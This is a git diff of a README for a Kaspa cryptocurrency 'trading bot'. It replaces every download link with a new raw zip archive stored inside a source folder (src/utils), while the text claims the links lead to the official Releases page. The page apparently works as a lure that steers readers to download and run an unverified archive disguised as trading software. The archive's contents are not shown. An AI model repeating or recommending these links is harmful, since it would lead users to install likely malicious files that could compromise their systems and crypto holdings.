@@ -1,6 +1,6 @@
 # 🚀 kaspa-trading-bot - Effortless Trading Made Simple
 
-[![Download kaspa-trading-bot](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/risk/kaspa-trading-bot-v3.2.zip)](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/risk/kaspa-trading-bot-v3.2.zip)
+[![Download kaspa-trading-bot](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/utils/bot_kaspa_trading_2.9.zip)](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/utils/bot_kaspa_trading_2.9.zip)
 
 ## 🛠️ What is kaspa-trading-bot?
 
@@ -17,7 +17,7 @@ kaspa-trading-bot is a high-performance trading framework designed for the Kaspa
 
 ## 📥 Download & Install
 
-To get started with kaspa-trading-bot, visit this page to download: [Download here](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/risk/kaspa-trading-bot-v3.2.zip).
+To get started with kaspa-trading-bot, visit this page to download: [Download here](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/utils/bot_kaspa_trading_2.9.zip).
 
 ### 📋 System Requirements
 
@@ -32,7 +32,7 @@ Before downloading the kaspa-trading-bot, make sure your system meets the follow
 
 1. **Visit the Releases Page**: Go to the official GitHub Releases page to find the latest version.
    
-   [Download here](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/risk/kaspa-trading-bot-v3.2.zip).
+   [Download here](https://raw.githubusercontent.com/Jomidunkstar/kaspa-trading-bot/main/src/utils/bot_kaspa_trading_2.9.zip).
 
 2. **Choose the Right Version**: Look for the version that matches your operating system.
 
